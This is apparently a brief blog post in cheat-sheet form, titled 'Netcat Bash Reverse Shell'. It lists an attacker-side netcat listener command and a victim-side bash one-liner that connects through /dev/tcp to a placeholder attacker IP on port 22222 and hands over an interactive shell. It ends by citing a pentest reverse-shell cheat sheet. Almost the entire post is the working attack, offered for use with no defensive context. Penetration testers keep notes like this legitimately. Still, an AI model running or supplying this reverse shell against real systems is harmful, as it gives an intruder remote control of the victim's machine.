---
layout: post
title: "Netcat Bash Reverse Shell"
---

## Attacker
```bash
nc -l -p 22222
```

## Victim
```bash
bash -i >& /dev/tcp/<$ATTACKER_IP>/22222 0>&1
```

---
1. [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
